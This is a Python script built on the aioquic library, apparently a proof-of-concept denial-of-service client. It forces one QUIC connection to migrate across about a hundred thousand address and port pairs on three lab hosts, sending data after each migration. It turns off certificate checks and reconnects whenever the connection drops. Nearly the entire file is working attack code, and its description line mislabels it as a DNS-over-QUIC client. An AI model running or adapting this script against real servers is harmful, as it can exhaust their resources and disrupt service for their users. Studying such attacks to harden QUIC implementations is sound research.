import argparse
import asyncio
import logging
import pickle
import ssl
import struct
from typing import Optional, cast

from aioquic.asyncio.client import connect, change_transport
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
# from aioquic.quic.events import QuicEvent, StreamDataReceived
from aioquic.quic.logger import QuicFileLogger
from multiprocessing import Process
from aioquic.quic.connection import QuicConnectionState

import time

logger = logging.getLogger("client")

class DosClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.stream_id = None

    async def send(self, d) -> None:
        data = bytes(d)
        data = struct.pack("!H", len(data)) + data

        # if self.stream_id == None:
        self.stream_id = self._quic.get_next_available_stream_id()
        self._quic.send_stream_data(self.stream_id, data, end_stream=True)
        self.transmit()

        return


def save_session_ticket(ticket):
    """
    Callback which is invoked by the TLS engine when a new session ticket
    is received.
    """
    logger.info("New session ticket received")
    if args.session_ticket:
        with open(args.session_ticket, "wb") as fp:
            pickle.dump(ticket, fp)


async def main(
    configuration: QuicConfiguration,
    host: str,
    port: int,
    transport: list
) -> None:
    logger.debug(f"Connecting to {host}:{port}")

    while(len(transport) > 0):
        try:
            configuration = QuicConfiguration(alpn_protocols=["dos-demo"], is_client=True)
            configuration.verify_mode = ssl.CERT_NONE
            async with connect(
                host,
                port,
                configuration=configuration,
                session_ticket_handler=save_session_ticket,
                create_protocol=DosClientProtocol,
                local_port=transport[0][1]
            ) as client:
                client = cast(DosClientProtocol, client)

                i = 0
                for ip, port in transport:
                    i+=1
                    host_str = "::ffff:" + str(ip)
                    client._transport.close()
                    if client._quic._state == QuicConnectionState.TERMINATED:
                        transport = transport[i:]
                        print("Terminated.....")
                        break

                    try:
                        await change_transport(client, port, host_str)
                        logger.debug(f"Changed Transport to {ip}:{port}")
                    except Exception as e:
                        print("EXCEPTION:", e)
                        continue
                    # logger.debug("Sending Data to Server: " + str(i))
                    await client.send(i)
                    time.sleep(0.5)
        except ConnectionError:
            print("EXCEPTION: Connection Error")
            continue

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS over QUIC client")
    parser.add_argument(
        "--host",
        type=str,
        default="localhost",
        help="The remote peer's host name or IP address",
    )
    parser.add_argument(
        "--port", type=int, default=853, help="The remote peer's port number"
    )
    parser.add_argument(
        "-k",
        "--insecure",
        action="store_true",
        help="do not validate server certificate",
    )
    parser.add_argument(
        "--ca-certs", type=str, help="load CA certificates from the specified file"
    )
    parser.add_argument(
        "-q",
        "--quic-log",
        type=str,
        help="log QUIC events to QLOG files in the specified directory",
    )
    parser.add_argument(
        "-l",
        "--secrets-log",
        type=str,
        help="log secrets to a file, for use with Wireshark",
    )
    parser.add_argument(
        "-s",
        "--session-ticket",
        type=str,
        help="read and write session ticket from the specified file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="increase logging verbosity"
    )

    args = parser.parse_args()

    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )

    configuration = QuicConfiguration(alpn_protocols=["dos-demo"], is_client=True)
    if args.ca_certs:
        configuration.load_verify_locations(args.ca_certs)
    if args.insecure:
        configuration.verify_mode = ssl.CERT_NONE
    if args.quic_log:
        configuration.quic_logger = QuicFileLogger(args.quic_log)
    if args.secrets_log:
        configuration.secrets_log_file = open(args.secrets_log, "a")
    if args.session_ticket:
        try:
            with open(args.session_ticket, "rb") as fp:
                configuration.session_ticket = pickle.load(fp)
        except FileNotFoundError:
            logger.debug(f"Unable to read {args.session_ticket}")
            pass
    else:
        logger.debug("No session ticket defined...")
    
    transport = []
    for ipLast in range(128, 131):
        for port in range(30000, 64000):
            transport.append(("192.168.40." + str(ipLast), port))

    asyncio.run(
            main(
                configuration=configuration,
                host=args.host,
                port=args.port,
                transport = transport
        )
    )
